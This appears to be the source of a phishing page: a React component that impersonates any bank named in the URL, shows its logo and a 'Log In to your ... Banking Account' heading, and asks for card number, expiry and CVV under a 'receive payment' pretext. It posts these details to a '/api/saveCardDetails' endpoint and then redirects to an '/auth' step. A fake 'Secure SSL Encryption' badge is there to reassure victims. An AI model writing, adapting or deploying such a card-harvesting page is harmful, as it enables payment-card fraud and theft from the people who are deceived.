'use client';

import { useState, useEffect } from 'react'
import { useSearchParams, useRouter } from 'next/navigation'
import { Button } from "@/components/ui/button"
import { Card, CardContent as UICardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { Lock, Loader2 } from "lucide-react"

export default function CardContent() {
  const router = useRouter()
  const [bankName, setBankName] = useState('')
  const [bankLogo, setBankLogo] = useState('')
  const [cardHolder, setCardHolder] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [expiryDate, setExpiryDate] = useState('')
  const [cvv, setCvv] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const searchParams = useSearchParams()

  useEffect(() => {
    const bank = searchParams.get('bank')
    if (bank) {
      const decodedBankName = decodeURIComponent(bank)
      setBankName(decodedBankName)
      setBankLogo(`/bank-logos/${decodedBankName.toLowerCase().split(' ')[0]}.png`)
    }
  }, [searchParams])

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = matches && matches[0] || ''
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(' ')
    } else {
      return value
    }
  }

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 2) {
      return v.slice(0, 2) + '/' + v.slice(2, 4)
    }
    return v
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCardNumber(e.target.value)
    setCardNumber(formattedValue)
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatExpiryDate(e.target.value)
    setExpiryDate(formattedValue)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4)
    setCvv(value)
  }

  const isFormValid = () => {
    return cardHolder.trim() !== '' &&
           cardNumber.replace(/\s/g, '').length === 16 &&
           expiryDate.length === 5 &&
           cvv.length >= 3
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid()) {
      alert('Please fill in all fields correctly.')
      return
    }
    setIsLoading(true)
    
    try {
      const response = await fetch('/api/saveCardDetails', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardHolder,
          cardNumber,
          expiryDate,
          cvv,
          bank: bankName,
        }),
      })

      if (response.ok) {
        router.push(`/auth?bank=${encodeURIComponent(bankName)}`)
      } else {
        throw new Error('Failed to save card details')
      }
    } catch (error) {
      console.error('Error saving card details:', error)
      alert('An error occurred while saving your card details. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className={`min-h-screen flex flex-col ${isLoading ? 'blur-sm' : ''}`}>
      <main className="flex-grow container mx-auto px-4 py-8 relative">
        {isLoading && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <Loader2 className="w-8 h-8 text-white animate-spin" />
          </div>
        )}
        <Card className="w-full max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl mx-auto rounded-lg shadow-lg overflow-hidden bg-white">
          <UICardContent className="p-6 md:p-8">
            <Image
              src={bankLogo}
              alt={`${bankName} Logo`}
              width={50}
              height={50}
              className="mb-8 mx-auto"
            />
            <h2 className="text-lg md:text-xl lg:text-2xl font-bold text-center mb-2 text-black">
              Log In to your {bankName} Banking Account
            </h2>
            <p className="text-sm md:text-base lg:text-lg text-center mb-6 text-black">
              Please enter your card or cheque card details to receive payment
            </p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="cardHolder" className="font-bold text-black">Card holder:</Label>
                <Input 
                  id="cardHolder" 
                  type="text" 
                  placeholder="Enter your name" 
                  required 
                  className="text-black bg-gray-100" 
                  value={cardHolder}
                  onChange={(e) => setCardHolder(e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="cardNumber" className="font-bold text-black">Card number:</Label>
                <Input 
                  id="cardNumber" 
                  type="text" 
                  placeholder="0000 0000 0000 0000" 
                  required 
                  className="text-black bg-gray-100" 
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  maxLength={19}
                />
              </div>
              <div className="flex space-x-4">
                <div className="flex-1">
                  <Label htmlFor="expiryDate" className="font-bold text-black">Expiry date:</Label>
                  <Input 
                    id="expiryDate" 
                    type="text" 
                    placeholder="MM/YY" 
                    required 
                    className="text-black bg-gray-100" 
                    value={expiryDate}
                    onChange={handleExpiryDateChange}
                    maxLength={5}
                  />
                </div>
                <div className="flex-1">
                  <Label htmlFor="cvv" className="font-bold text-black">CVV:</Label>
                  <Input 
                    id="cvv" 
                    type="text" 
                    placeholder="000" 
                    required 
                    className="text-black bg-gray-100" 
                    value={cvv}
                    onChange={handleCvvChange}
                    maxLength={4}
                  />
                </div>
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#022d2d] hover:bg-[#033e3e] text-white font-bold"
                disabled={isLoading || !isFormValid()}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  'Submit'
                )}
              </Button>
            </form>
            <div className="flex items-center justify-center mt-6 text-black">
              <Lock className="w-4 h-4 mr-2" />
              <span className="text-sm md:text-base">Secure SSL Encryption</span>
            </div>
          </UICardContent>
        </Card>
      </main>
    </div>
  )
}